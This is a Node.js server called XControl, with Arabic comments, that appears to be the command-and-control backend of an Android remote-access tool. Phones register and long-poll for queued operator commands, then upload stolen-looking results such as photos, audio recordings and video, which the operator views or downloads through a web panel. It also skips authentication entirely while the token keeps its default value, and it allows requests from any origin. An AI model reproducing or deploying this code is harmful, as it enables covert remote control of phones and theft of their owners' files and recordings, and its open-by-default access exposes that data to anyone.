#!/usr/bin/env node
const http = require('http'), fs = require('fs'), path = require('path'), crypto = require('crypto'), os = require('os');

const PORT  = process.env.PORT || 8080;
const TOKEN = process.env.TOKEN || 'change-me';
const MAX_DATA = 60 * 1024 * 1024;           // حد حجم الطلب: 60MB
const RESULT_TTL = 3600000;                  // النتائج تبقى ساعة واحدة
const DEVICE_TTL = 300000;                   // الجهاز يعتبر متصلًا خلال 5 دقائق
const DISK_THRESHOLD = 3000000;              // النتائج الأكبر من ~2.2MB تُحفظ على القرص بدل الذاكرة

const devices = new Map(), queues = new Map(), results = new Map(), waiters = new Map();

// دليل مؤقت للملفات الكبيرة (يمنع امتلاء ذاكرة Render)
function diskDir() {
  const d = path.join(os.tmpdir(), 'xcontrol');
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
  return d;
}
function resultFile(cmdId) { return path.join(diskDir(), cmdId + '.b64'); }

setInterval(() => {
  const now = Date.now();
  for (const [id, d] of devices) if (now - d.lastSeen > DEVICE_TTL) { devices.delete(id); queues.delete(id); }
  for (const [k, r] of results) {
    if (now - r.t > RESULT_TTL) {
      results.delete(k);
      if (r.onDisk) try { fs.unlinkSync(resultFile(k)); } catch (e) {}
    }
  }
}, 60000);

function send(res, code, obj) {
  const body = typeof obj === 'string' ? obj : JSON.stringify(obj);
  res.writeHead(code, {'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*'});
  res.end(body);
}
function authed(req) {
  if (TOKEN === 'change-me') return true;
  const t = req.headers['x-token'] || new URL(req.url, 'http://x').searchParams.get('t');
  return t === TOKEN;
}

// نوع MIME حسب امتداد الملف — ضروري حتى تُعرض الصورة/الصوت/الفيديو داخل اللوحة
function mimeFor(fname) {
  const ext = (fname || '').split('.').pop().toLowerCase();
  const m = {
    jpg: 'image/jpeg', jpeg: 'image/jpeg', png: 'image/png', gif: 'image/gif',
    webp: 'image/webp', bmp: 'image/bmp',
    mp4: 'video/mp4', '3gp': 'video/3gpp', webm: 'video/webm', mkv: 'video/x-matroska',
    m4a: 'audio/mp4', mp3: 'audio/mpeg', aac: 'audio/aac', wav: 'audio/wav',
    ogg: 'audio/ogg', amr: 'audio/amr'
  };
  return m[ext] || 'application/octet-stream';
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;

  // CORS: السماح بطلبات من أي مصدر ولأي ترويسة (للأدوات الخارجية والمتصفح)
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-token'
    });
    return res.end();
  }

  let buf = [], total = 0, tooBig = false;
  req.on('data', c => { total += c.length; if (total <= MAX_DATA) buf.push(c); else tooBig = true; });
  req.on('end', () => {
    // رفض الطلبات الأكبر من الحد برسالة واضحة بدل قصّ البيانات بصمت (سبب فشل الرفع القديم)
    if (tooBig) return send(res, 413, {error: 'request too large (max ' + Math.floor(MAX_DATA / 1048576) + 'MB)'});

    let j = null;
    try { const s = Buffer.concat(buf).toString('utf8'); j = s ? JSON.parse(s) : null; } catch (e) {}
    const now = Date.now();

    if (p === '/' || p === '/index.html') {
      return fs.readFile(path.join(__dirname, 'public', 'index.html'), (e, data) => {
        if (e) return send(res, 500, {error: 'panel missing'});
        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
        res.end(data);
      });
    }
    if (!authed(req)) return send(res, 403, {error: 'bad token'});

    if (p === '/register' && req.method === 'POST') {
      const id = String((j && j.id) || crypto.randomUUID());
      const old = devices.get(id);
      devices.set(id, { id,
        name: String((j && j.name) || 'device'), model: String((j && j.model) || ''),
        android: String((j && j.android) || ''), ip: req.socket.remoteAddress,
        lastSeen: now, firstSeen: old ? old.firstSeen : now });
      if (!queues.has(id)) queues.set(id, []);
      return send(res, 200, {ok: true, id});
    }
    if (p === '/poll' && req.method === 'POST') {
      const id = j && j.id; const d = devices.get(id);
      if (!d) return send(res, 200, {});
      d.lastSeen = now;
      const q = queues.get(id) || [];
      if (q.length) { const c = q.shift(); return send(res, 200, {cmd: c.cmd, args: c.args, cmdId: c.cmdId}); }
      const oldW = waiters.get(id);
      if (oldW) { clearTimeout(oldW.t); send(oldW.res, 200, {}); }
      const t = setTimeout(() => { waiters.delete(id); send(res, 200, {}); }, 25000);
      waiters.set(id, {res, t});
      return;
    }
    if (p === '/result' && req.method === 'POST') {
      const {id, cmdId, ok, data, fname} = j || {};
      if (!cmdId) return send(res, 400, {error: 'missing cmdId'});
      const r = {id, cmdId, ok: !!ok, data: data || null, fname: fname || null, t: now};
      // الملفات الكبيرة تُحفظ على القرص مؤقتًا بدل الذاكرة — يحمي Render من الامتلاء عند رفع عدة ملفات كبيرة
      if (r.data && r.data.length > DISK_THRESHOLD) {
        try {
          fs.writeFileSync(resultFile(cmdId), r.data);
          r.size = Math.round(r.data.length * 0.75); // الحجم الأصلي التقريبي
          r.data = null; r.onDisk = true;
        } catch (e) { r.onDisk = false; }
      }
      results.set(cmdId, r);
      const d = devices.get(id); if (d) d.lastSeen = now;
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, {ok: true});
    }
    if (p === '/api/devices')
      return send(res, 200, [...devices.values()].sort((a, b) => b.lastSeen - a.lastSeen));

    if (p === '/api/exec' && req.method === 'POST') {
      const {id, cmd, args} = j || {};
      if (!id || !devices.has(id)) return send(res, 404, {error: 'device offline'});
      const cmdId = crypto.randomUUID();
      queues.get(id).push({cmdId, cmd, args: args || {}, t: now});
      // الإصلاح: إيقاظ poll المنتظر فورًا → يستلم الوكيل الأمر خلال أقل من ثانية
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, {ok: true, cmdId});
    }
    if (p === '/api/results' && req.method === 'POST') {
      const {id} = j || {};
      const list = [...results.values()].filter(r => r.id === id).sort((a, b) => a.t - b.t).slice(-60)
        .map(r => {
          const big = (r.data && r.data.length > 700000) || !!r.onDisk;
          return {cmdId: r.cmdId, ok: r.ok, fname: r.fname, file: big,
                  size: r.size || (r.data ? Math.round(r.data.length * 0.75) : 0),
                  data: big ? null : r.data, t: r.t};
        });
      return send(res, 200, list);
    }
    if (p.startsWith('/api/file/')) {
      const cmdId = decodeURIComponent(p.slice('/api/file/'.length));
      const r = results.get(cmdId);
      if (!r || (r.data == null && !r.onDisk)) return send(res, 404, {error: 'expired'});
      let b;
      try {
        b = r.onDisk ? fs.readFileSync(resultFile(cmdId)) : Buffer.from(r.data, 'base64');
      } catch (e) { return send(res, 500, {error: 'decode'}); }
      const fname = (r.fname || 'file').replace(/["\r\n]/g, '');
      // dl=1 يُجبر المتصفح على التنزيل؛ وبدونه تُعرض الصور/الصوت/الفيديو داخل اللوحة مباشرة
      const force = u.searchParams.get('dl') === '1';
      const disposition = (force || !/^(image|audio|video)\//.test(mimeFor(fname)))
        ? 'attachment' : 'inline';
      res.writeHead(200, {
        'Content-Type': mimeFor(fname),
        'Content-Length': b.length,
        'Access-Control-Allow-Origin': '*',
        'Content-Disposition': disposition + '; filename="' + fname + '"'
      });
      return res.end(b);
    }
    send(res, 404, {error: 'not found'});
  });
});

server.listen(PORT, () => console.log(`XControl on :${PORT}`));
